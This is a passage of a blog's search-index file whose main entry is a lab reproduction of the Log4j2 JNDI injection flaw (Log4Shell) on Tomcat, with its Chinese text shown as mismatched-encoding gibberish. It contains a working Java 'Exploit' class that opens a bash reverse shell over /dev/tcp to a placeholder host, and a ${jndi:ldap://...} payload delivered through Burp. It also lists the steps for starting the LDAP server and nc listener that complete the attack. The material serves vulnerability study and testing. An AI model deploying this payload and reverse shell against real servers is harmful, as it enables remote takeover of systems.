class="string">&quot;info&quot;</span>&gt;</span><br><span class="line">            &lt;AppenderRef ref=<span class="string">&quot;LOCALHOST&quot;</span> /&gt;</span><br><span class="line">        &lt;/Logger&gt;</span><br><span class="line">        &lt;Root level=<span class="string">&quot;debug&quot;</span>&gt;</span><br><span class="line">            &lt;AppenderRef ref=<span class="string">&quot;CATALINA&quot;</span> /&gt;</span><br><span class="line">            &lt;AppenderRef ref=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span><br><span class="line">        &lt;/Root&gt;</span><br><span class="line">    &lt;/Loggers&gt;</span><br><span class="line">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure></div><p>2ã€log4j2ç»„ä»¶å¼•ç”¨</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] å°†3ä¸ª log4j2 jaråŒ… å’Œ tomcat-juli-adapters.jaræ”¾åˆ° tomact ç›®å½•ä¸‹çš„libæ–‡ä»¶å¤¹ä¸‹</span><br><span class="line">[+] tomcat-juli.jar æ›¿æ¢tomcatç›®å½•ä¸‹ bin æ–‡ä»¶å¤¹ä¸‹çš„åŒåæ–‡ä»¶</span><br><span class="line">[+] åˆ é™¤tomactç›®å½•ä¸‹confæ–‡ä»¶å¤¹ä¸‹çš„logging.propertiesæ–‡ä»¶ï¼Œå¹¶å°†æ–°å»ºçš„log4j2.xmlï¼Œæ”¾åˆ°tomcatç›®å½•ä¸‹libæ–‡ä»¶å¤¹ä¸‹</span><br></pre></td></tr></table></figure></div><p>3ã€å¯åŠ¨ç¯å¢ƒ</p><h2 id="0x05-æ¼æ´å¤ç°"><a href="#0x05-æ¼æ´å¤ç°" class="headerlink" title="0x05 æ¼æ´å¤ç°"></a>0x05 æ¼æ´å¤ç°</h2><p>2ã€æ‰‹åŠ¨å¤ç°</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:8080/examples/servlets/servlet/RequestParamExample</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/log4j2/2.png" data-caption="image-20220901133439529"><img src="/../images/log4j2/2.png" alt="image-20220901133439529"></a></p><p><a data-fancybox="gallery" data-src="/../images/log4j2/3.png" data-caption="image-20220901133243059"><img src="/../images/log4j2/3.png" alt="image-20220901133243059"></a></p><p><a data-fancybox="gallery" data-src="/../images/log4j2/4.png" data-caption="image-20220901133342785"><img src="/../images/log4j2/4.png" alt="image-20220901133342785"></a></p><p>åå¼¹shell</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="comment">// è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">           String[] commands = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">           <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands);</span><br><span class="line">           pc.waitFor();</span><br><span class="line">      &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> &#123;</span><br><span class="line">       <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¯åŠ¨æ¶æ„ç±»</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/5.png" data-caption="image-20220901135410419"><img src="/../images/log4j2/5.png" alt="image-20220901135410419"></a></p><p>å¼€å¯LDAPæœåŠ¡</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/6.png" data-caption="image-20220901140229204"><img src="/../images/log4j2/6.png" alt="image-20220901140229204"></a></p><p>å¼€å¯ncç›‘å¬</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/7.png" data-caption="image-20220901140258163"><img src="/../images/log4j2/7.png" alt="image-20220901140258163"></a></p><p>burpæ”¾åŒ…ï¼Œæ‰§è¡Œå‘½ä»¤åå¼¹shell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://x.x.x.x:1234/Exploit&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/log4j2/8.png" data-caption="image-20220901135944613"><img src="/../images/log4j2/8.png" alt="image-20220901135944613"></a></p><p>è·å–shell</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/9.png" data-caption="image-20220901140041503"><img src="/../images/log4j2/9.png" alt="image-20220901140041503"></a></p><p>1ã€Burpæ’ä»¶è¢«åŠ¨æ‰«æ</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://f0ng.github.io/2021/12/22/log4j2burpscanner/</span><br></pre></td></tr></table></figure></div><p>é…ç½®è‡ªå·±çš„ceye.io</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/10.png" data-caption="image-20220901181915587"><img src="/../images/log4j2/10.png" alt="image-20220901181915587"></a></p><p><a data-fancybox="gallery" data-src="/../images/log4j2/11.png" data-caption="image-20220901181949766"><img src="/../images/log4j2/11.png" alt="image-20220901181949766"></a></p><p>éšåå¼€å¯Burpï¼Œç½‘ç«™ç‚¹ç‚¹ç‚¹ï¼Œè¿›è¡Œè¢«åŠ¨æ‰«æ</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/12.png" data-caption="image-20220901161415792"><img src="/../images/log4j2/12.png" alt="image-20220901161415792"></a></p><p>ceye.ioæ¥æ”¶åˆ°è¯·æ±‚</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/13.png" data-caption="image-20220901161537040"><img src="/../images/log4j2/13.png" alt="image-20220901161537040"></a></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/A0CnPqZO3cP3gWpItxvIbA</span><br><span class="line">https://blog.csdn.net/tutian2000/article/details/81903924</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å¤ç° </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Log4j2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç«™æ‚è´§åº—-ç¼˜èµ·</title>
      <link href="/2022/09/01/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E7%BC%98%E8%B5%B7/"/>
      <url>/2022/09/01/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E7%BC%98%E8%B5%B7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/private/3.png" data-caption="image-20220901140741054"><img src="/../images/private/3.png" alt="image-20220901140741054"></a></p><h2 id="ç¼˜èµ·"><a href="#ç¼˜èµ·" class="headerlink" title="ç¼˜èµ·"></a>ç¼˜èµ·</h2><p>è¿‘å¹´åœ¨å­¦ä¹ çš„æ—¶å€™ï¼Œè™½ç„¶ä¹Ÿæœ‰ä½œç¬”è®°çš„ä¹ æƒ¯ï¼Œä¸æ—¶å›çœ‹ï¼Œä¸çŸ¥æ‰€äº‘ï¼Œå»ºç«‹æ­¤åšå®¢ç”¨äºè®°å½•å­¦ä¹ çš„è¿‡ç¨‹ï¼Œå½“ç„¶ä¹Ÿä¼šä¸æ—¶åˆ†äº«å¥‡é—»è¶£äº‹ï¼Œä¸ªäººæ„Ÿæƒ³ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å°ç«™æ‚è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°ç«™æ‚è®° </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
